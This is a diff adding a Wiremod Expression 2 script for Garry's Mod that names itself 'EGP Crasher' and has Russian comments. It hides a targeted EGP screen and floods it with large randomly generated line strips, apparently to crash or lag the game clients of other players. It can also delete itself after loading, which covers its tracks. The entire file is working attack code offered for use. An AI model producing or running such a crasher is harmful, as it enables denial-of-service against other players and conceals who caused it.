@@ -1,0 +1,99 @@
+@persist EGPCN Valid EGPC:wirelink [E O]:entity MakeDonut Mode MaxLines AutoDelete Interact
+interval(10)
+if(first())
+{
+    noDuplications()
+    O=owner()
+    E=entity()
+    MaxLines=1380
+    MakeDonut=0 #повесить ли на ЕГП пончик?
+    Mode=1 # 1: медленный и аккуратный, 2:быстрый с Lua ошибками в консоли
+    AutoDelete=1
+    function void wirelink:egpLoadJunk(Index:number)
+    {
+        local EGPCVEC2=array()
+        for(B=1,MaxLines)
+        {
+            EGPCVEC2:pushVector2(randvec2(-5000,5000))
+        }
+        This:egp3DTracker(egpMaxObjects()-Index,vec())
+        This:egpParent(egpMaxObjects()-Index,E)
+        This:egpLineStrip(Index,EGPCVEC2)
+        This:egpAlpha(Index,255)
+        This:egpMaterial(Index,"vgui/e2logo")
+        This:egpParent(Index,egpMaxObjects()-Index)
+    }
+}
+if(changed(Valid)&Valid)
+{
+    timer("percent",1000)
+}
+switch(Valid)
+{
+    case(1),
+    switch(Mode)
+    {
+        case(1),
+        ModeVar=egpCanSendUmsg()
+        break
+        case(2),
+        ModeVar=1
+        break
+        default,
+        ModeVar=1
+        break
+    }
+    if(clk("percent"))
+    {
+        print("["+E:id()+"] "+round((100/150)*EGPCN)+"%, ["+EGPCN+"/150]")
+        timer("percent",1000)
+    }
+    while(EGPCN<=150&perf(80)&ModeVar)
+    {
+        EGPCN++
+        EGPC:egpLoadJunk(EGPCN)
+    }
+    break
+    case(0),
+    if(changed(O:keyAttack2())&O:keyAttack2())
+    {
+        EGPC=O:aimEntity():wirelink()
+        EGPCE=EGPC:entity()
+        if(MakeDonut)
+        {
+            holoCreate(-10000)
+            holoPos(-10000,EGPCE:pos())
+            holoAng(-10000,EGPCE:angles())
+            holoParent(-10000,EGPCE)
+            holoModel(-10000,"models/noesis/donut.mdl")
+        }
+        EGPCE:setAlpha(0)
+        print("[EGP Crasher] Loading...")
+        Valid=1
+    }
+    break
+    case(2),
+    
+    break
+}
+if(changed(EGPCN)&EGPCN==150)
+{
+    print("[EGP Crasher] Ready.")
+    switch(AutoDelete)
+    {
+        case(1),
+        selfDestruct()
+        break
+        case(0),
+        Interact=1
+        Valid=2
+        break
+    }
+}
+if(Interact)
+{
+    if(changed(O:keyPressed("G"))&O:keyPressed("G"))
+    {
+        EGPC:egpLoadJunk(EGPCN)
+    }
+}
